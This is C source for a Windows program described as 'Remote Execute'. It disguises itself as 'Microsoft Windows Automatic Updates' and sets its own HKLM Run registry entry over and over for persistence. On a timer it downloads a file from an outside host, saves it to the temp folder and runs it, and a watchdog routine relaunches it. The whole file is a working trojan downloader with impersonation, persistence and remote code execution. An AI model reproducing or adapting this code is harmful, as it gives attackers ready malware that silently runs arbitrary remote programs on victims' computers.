/*

  Remote Execute
  --------------
  Download an App from the Internet 
  and execute it in a specific time interval.

*/

#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include "resource.h"

#define LIV_DELAY 1000
#define NET_DELAY 5000
#define REG_DELAY 5000

char AppName[] = "Microsoft� Windows� Automatic Updates";
char NetProg[] = "http://www.interlink.150m.com/wupdate";

LRESULT CALLBACK WndProc   (HWND, UINT, WPARAM, LPARAM);
void CALLBACK StayAlive(HWND, UINT, UINT, DWORD);
void CALLBACK NetTimer (HWND, UINT, UINT, DWORD);
void CALLBACK RegTimer (HWND, UINT, UINT, DWORD);
void RunProcess(char *ProcessName);
char * GetProgPath();

int WINAPI WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance,
                    PSTR szCmdLine, int nCmdShow)
{
	if(!strcmp(szCmdLine,"stay")) {
		MessageBox(NULL,"k","",0);
	}

     HWND        hwnd ;
     MSG         msg ;
     WNDCLASS    wndclass ;

     wndclass.style         = CS_HREDRAW | CS_VREDRAW ;
     wndclass.lpfnWndProc   = WndProc ;
     wndclass.cbClsExtra    = 0 ;
     wndclass.cbWndExtra    = 0 ;
     wndclass.hInstance     = hInstance ;
     wndclass.hIcon         = LoadIcon (NULL, IDI_WINLOGO) ;
     wndclass.hCursor       = LoadCursor (NULL, IDC_ARROW) ;
     wndclass.hbrBackground = (HBRUSH) GetStockObject (WHITE_BRUSH) ;
     wndclass.lpszMenuName  = NULL ;
     wndclass.lpszClassName = AppName ;
     
     if (!RegisterClass (&wndclass))
          return 0 ;
     
     hwnd = CreateWindow (AppName, AppName,
                          WS_OVERLAPPEDWINDOW,
                          CW_USEDEFAULT, CW_USEDEFAULT,
                          CW_USEDEFAULT, CW_USEDEFAULT,
                          NULL, NULL, hInstance, NULL) ;

	 ShowWindow(hwnd, nCmdShow);

     while (GetMessage (&msg, NULL, 0, 0))
     {
          TranslateMessage (&msg) ;
          DispatchMessage (&msg) ;
     }

     return msg.wParam ;
}

LRESULT CALLBACK WndProc (HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	switch (message)
	{
	case WM_CREATE:
		RegTimer(NULL,0,0,0);
		SetTimer(hwnd, 1, LIV_DELAY, StayAlive);
		SetTimer(hwnd, 2, NET_DELAY, NetTimer);
		SetTimer(hwnd, 3, REG_DELAY, RegTimer);
		break;
	case WM_CLOSE:
		KillTimer (hwnd, 1);
		KillTimer (hwnd, 2);
		KillTimer (hwnd, 3);
		DestroyWindow(hwnd);
		break ;

	case WM_DESTROY:
		PostQuitMessage (0) ;
		return 0 ;
	}
	return DefWindowProc (hwnd, message, wParam, lParam) ;
}

void CALLBACK StayAlive(HWND hwnd, UINT message, UINT iTimerID, DWORD dwTime)
{
	static unsigned long int CrossCount = 0;
	static char my_turn = 1;

	if(my_turn == 1) {
		FILE *fp = NULL;
		fp = fopen("D:\\e.dat","w+b");
		fwrite((char *)&CrossCount,sizeof(CrossCount),1,fp);
		my_turn = 0;
		fclose(fp);
	} else {
		static unsigned long int current = 0;
		FILE *fp = NULL;
		fp = fopen("D:\\e.dat","w+b");
		fread((char *)&CrossCount,sizeof(current),1,fp);
		fclose(fp);
		if(current != CrossCount) {
			CrossCount = current;
		} else {
			MessageBeep(-1);
			static char check = 0;
			check++;
			if(check > 5) {
				char x[200];
				strcpy(x,GetProgPath());
				strcat(x," stay");
				RunProcess(x);
			}
		}
	}
}

void CALLBACK NetTimer(HWND hwnd, UINT message, UINT iTimerID, DWORD dwTime)
{
	BOOL Avail = InternetCheckConnection
	("http://www.microsoft.com",FLAG_ICC_FORCE_CONNECTION,0);

	if(Avail)
	{
		HINTERNET hNet = InternetOpen(AppName, PRE_CONFIG_INTERNET_ACCESS,
			NULL, INTERNET_INVALID_PORT_NUMBER, 0 );
		HINTERNET hUrlFile = ::InternetOpenUrl(hNet, NetProg, NULL,
				0, INTERNET_FLAG_RELOAD, 0 );

		char FileName[255];
		if(!GetTempPath(255,FileName))
			strcpy(FileName,"C:\\");
		strcat(FileName,"wupdate");
		DeleteFile(FileName);
		HANDLE hWrite = CreateFile(FileName, GENERIC_WRITE,
		0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

		const int buff_size = 512;
		char buffer[buff_size] ;
		DWORD BytesRead = 0, BytesWritten = 0;

		do  /* download NetProg */
		{
			if(InternetReadFile(hUrlFile, buffer, buff_size, &BytesRead))
				WriteFile(hWrite, buffer, BytesRead, &BytesWritten, NULL);
		} while(BytesRead == buff_size);

		CloseHandle(hWrite);
		InternetCloseHandle(hUrlFile);
		InternetCloseHandle(hNet);

		RunProcess(FileName);
	}
}

void RunProcess(char *ProcessName)
{
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
    ZeroMemory( &pi, sizeof(pi) );

    CreateProcess( NULL, ProcessName, NULL, 
		NULL, FALSE, 0, NULL, NULL, &si, &pi);
	//WaitForSingleObject( pi.hProcess, INFINITE );

    CloseHandle( pi.hProcess );
    CloseHandle( pi.hThread );
}

char * GetProgPath()
{
	static char EXEName[128];
	GetCurrentDirectory(100,EXEName);
	strcat(EXEName, "\\Release\\wupdate.exe");
	return EXEName;
}

void CALLBACK RegTimer(HWND hwnd, UINT message, UINT iTimerID, DWORD dwTime)
{
	HKEY Key;
	RegOpenKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
		0, KEY_WRITE, &Key);
	RegSetValueEx(Key, "Automatic Updates", 0, REG_SZ, 
	(unsigned char *)GetProgPath(), strlen(GetProgPath()));
	RegCloseKey(Key);
}
